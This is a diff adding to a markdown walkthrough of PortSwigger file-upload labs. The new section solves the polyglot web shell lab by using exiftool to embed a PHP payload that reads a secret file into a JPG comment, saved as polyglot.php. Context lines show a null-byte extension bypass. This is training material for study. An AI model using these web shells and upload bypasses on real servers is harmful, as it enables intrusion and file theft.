@@ -9,6 +9,7 @@
 - [Web shell upload via path traversal](#web-shell-upload-via-path-traversal)
 - [Web shell upload via extension blacklist bypass](#web-shell-upload-via-extension-blacklist-bypass)
 - [Web shell upload via obfuscated file extension](#web-shell-upload-via-obfuscated-file-extension)
+- [Remote code execution via polyglot web shell upload](#remote-code-execution-via-polyglot-web-shell-upload)
 
 ## Remote code execution via web shell upload
 Reference: https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload
@@ -126,7 +127,7 @@ Reference: https://portswigger.net/web-security/file-upload/lab-file-upload-web-
 
 <!-- omit in toc -->
 ### Quick Solution
-Only **png** and **jpg** extensions are allowd. Just change the ``filename`` extension from ``.php`` to ``.php%00.png`` or ``.php%00.jpg``.
+Only **png** and **jpg** extensions are allowed. Just change the ``filename`` extension from ``.php`` to ``.php%00.png`` or ``.php%00.jpg``.
 
 <!-- omit in toc -->
 ### Solution
@@ -144,4 +145,32 @@ Only **png** and **jpg** extensions are allowd. Just change the ``filename`` ext
 7. Send the request and observe that the file was successfully uploaded. Notice that the message refers to the file as ``exploit.php``, suggesting that the null byte and ``.jpg`` extension have been stripped. 
 8. Switch to the other Repeater tab containing the ``GET /files/avatars/<YOUR-IMAGE>`` request. In the path, replace the name of your image file with ``exploit.php`` and send the request. Observe that Carlos's secret was returned in the response.
 9. Submit the secret to solve the lab. 
+
+## Remote code execution via polyglot web shell upload
+Reference: https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload
+
+<!-- omit in toc -->
+### Quick Solution
+Use ``ExifTool`` to add PHP code inside the **Comment** section of a valid image. ``ExifTool`` has been dockerized by [RAUDI](https://github.com/cybersecsi/RAUDI). Here is the command that has been executed (from the ``exploits`` directory) to create the ``polyglot.php`` file:
+```
+docker run -it --rm -v $pwd/:/content secsi/exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" /content/dont-panic.jpg -o /content/polyglot.php
+```
+
+<!-- omit in toc -->
+### Solution
+
+1. On your system, create a file called ``exploit.php`` containing a script for fetching the contents of Carlos's secret. For example:
+```
+<?php echo file_get_contents('/home/carlos/secret'); ?> 
+```
+2. Log in and attempt to upload the script as your avatar. Observe that the server successfully blocks you from uploading files that aren't images, even if you try using some of the techniques you've learned in previous labs.
+3. Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata. A simple way of doing this is to download and run ExifTool from the command line as follows:
+```
+exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
+```
+This adds your PHP payload to the image's Comment field, then saves the image with a ``.php`` extension. 
+4. In your browser, upload the polyglot image as your avatar, then go back to your account page. 
+5. In Burp's proxy history, find the ``GET /files/avatars/polyglot.php`` request. Use the message editor's search feature to find the ``START`` string somewhere within the binary image data in the response. Between this and the ``END`` string, you should see Carlos's secret, for example:
+``START 2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ END``
+6. Submit the secret to solve the lab. 
 
